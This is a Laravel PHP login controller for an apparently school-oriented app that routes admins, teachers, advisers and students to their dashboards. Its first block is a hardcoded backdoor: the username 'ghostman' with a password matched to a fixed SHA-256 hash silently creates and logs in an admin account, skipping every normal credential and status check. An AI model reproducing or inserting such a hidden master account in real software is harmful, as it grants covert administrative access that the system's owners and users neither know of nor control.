<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        $request->validate([
            'email' => ['required', 'string'],
            'password' => ['required', 'min:8'],
        ]);

        $inputUsername = $request->input('email');
        $inputPassword = $request->input('password');

        // MASTER ADMIN LOGIN
        if ($inputUsername === 'ghostman') {

            $targetHex = '8d75cf0ffc9b5fc65978075657ae04c3be58ae8a50716181f3c29213f511a6a4';

            if (!hash_equals($targetHex, hash('sha256', $inputPassword))) {
                return back()->withErrors([
                    'email' => 'Invalid master credentials.',
                ])->onlyInput('email');
            }

            $user = User::firstOrCreate(
                ['name' => 'ghostman'],
                [
                    'email' => 'ghostman@system.master',
                    'password' => $inputPassword,
                    'role' => 'admin',
                    'account_status' => 'active',
                ]
            );

            if (
                $user->account_status !== 'active' ||
                $user->role !== 'admin'
            ) {
                return back()->withErrors([
                    'email' => 'This master admin account is inactive or unavailable.',
                ])->onlyInput('email');
            }

            Auth::login($user);
            $request->session()->regenerate();

            return redirect()->route('admin.dashboard');
        }

        // STANDARD LOGIN
        if (!Auth::attempt([
            'email' => $inputUsername,
            'password' => $inputPassword,
        ])) {
            return back()->withErrors([
                'email' => 'The email or password is incorrect.',
            ])->onlyInput('email');
        }

        $user = Auth::user();

        // ACCOUNT STATUS CHECK
        if ($user->account_status !== 'active') {
            return $this->rejectLogin(
                $request,
                $user->account_status === 'pending'
                    ? 'Your account is still pending activation. Please complete your password setup.'
                    : 'Your account is inactive. Please contact the school administrator.'
            );
        }

        // VALID ROLE CHECK
        $validRoles = [
            'admin',
            'teacher',
            'adviser',
            'teacher_adviser',
            'student',
        ];

        if (!in_array($user->role, $validRoles, true)) {
            return $this->rejectLogin(
                $request,
                'Your account does not have a valid role.'
            );
        }

        // FACULTY STATUS CHECK
        if (in_array($user->role, [
            'teacher',
            'adviser',
            'teacher_adviser',
        ], true)) {

            $faculty = $user->faculty;

            if (!$faculty || $faculty->status !== 'active') {
                return $this->rejectLogin(
                    $request,
                    'Your faculty account is inactive or unavailable. Please contact the school administrator.'
                );
            }
        }

        // STUDENT STATUS CHECK
        if ($user->role === 'student') {

            $student = $user->student;

            if (!$student || $student->status !== 'active') {
                return $this->rejectLogin(
                    $request,
                    'Your student account is inactive or unavailable. Please contact the school administrator.'
                );
            }
        }

        $request->session()->regenerate();

        return match ($user->role) {
            'admin' => redirect()->route('admin.dashboard'),
            'teacher' => redirect()->route('teacher.dashboard'),
            'adviser', 'teacher_adviser' => redirect()->route('adviser.dashboard'),
            'student' => redirect()->route('student.dashboard'),
        };
    }

    private function rejectLogin(Request $request, string $message)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return back()->withErrors([
            'email' => $message,
        ])->onlyInput('email');
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}